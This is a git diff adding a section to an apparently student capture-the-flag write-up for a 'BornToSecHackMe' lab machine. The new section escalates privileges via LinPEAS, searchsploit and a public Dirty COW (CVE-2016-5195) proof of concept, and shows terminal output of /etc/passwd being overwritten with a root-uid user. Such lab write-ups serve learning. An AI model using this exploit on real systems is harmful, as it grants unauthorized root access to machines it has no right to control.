@@ -10,6 +10,7 @@
 	- [Gaining Access](#gaining-access)
 		- [Writeup 1](#writeup-1)
 		- [Writeup 2](#writeup-2)
+		- [Writeup 3](#writeup-3)
 
 ## Introduction
 
@@ -531,3 +532,65 @@ This is it with write up 1, in order to pass the project we need to discover 2 d
 I will continue with my second attempt in [Writeup 2](#writeup-2)
 
 ### Writeup 2
+The first thing I do now as the "Main" exploit track has finished is running LinPEAS, as I do have already access to a user on the server via SSH.
+```
+LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.
+```
+The discovery legend is as follows:
+
+TODO: IMAGE
+
+We get straight at the very beginning a `RED/YELLOW` hit under the Linux version which is very promising in escalating privileges.
+
+TODO: IMAGE KERNEL VERSION
+
+A quick check with `searchsploit` reveals that this linux version does have a very serious vulnerability `CVE-2016-5195` aka `Dirty COW`.
+
+TODO: IMAGE SEARCHSPLOIT
+
+Why is it called Dirty COW?
+```
+"A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system."
+```
+[Official Source](https://dirtycow.ninja/) <br>
+
+What is a Race Condition Vulnerability?
+```
+A race condition attack happens when a computing system that’s designed to handle tasks in a specific sequence is forced to perform two or more operations simultaneously. This technique takes advantage of a time gap between the moment a service is initiated and the moment a security control takes effect. This attack, which depends on multithreaded applications, can be delivered in one of two ways: interference caused by untrusted processes (essentially a piece of code that slips into a sequence between steps of a secure programs), and interference caused by a trusted process, which may have the "same'' privileges.
+```
+
+I gonna use the POC `dirtycow` script by ["FireFart"](https://github.com/FireFart/dirtycow) for ths exploit.
+This great [Video](https://www.youtube.com/watch?v=kEsshExn7aE) also explains in detail on how the POC script works and what we are actually exploiting while going for the race condition vulnerability.
+
+Let's run the script:
+```
+thor@BornToSecHackMe:~$ ./dirty password
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: password
+Complete line:
+firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
+
+mmap: b7fda000
+madvise 0
+
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+```
+We get the address part of the memory returned in which `mmap` mapped the file into the memory.
+Let's check if the new user has been created:
+```
+firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
+```
+
+User has been indeed created. Let's change the user to `firefart` and check if we have root access:
+```
+firefart@BornToSecHackMe:/home/thor# whoami
+firefart
+firefart@BornToSecHackMe:/home/thor# id
+uid=0(firefart) gid=0(root) groups=0(root)
+```
+We do have gained successfully the root access!
+
+### Writeup 3
+
+The mandatory part is done, now we are going for the bonus points!
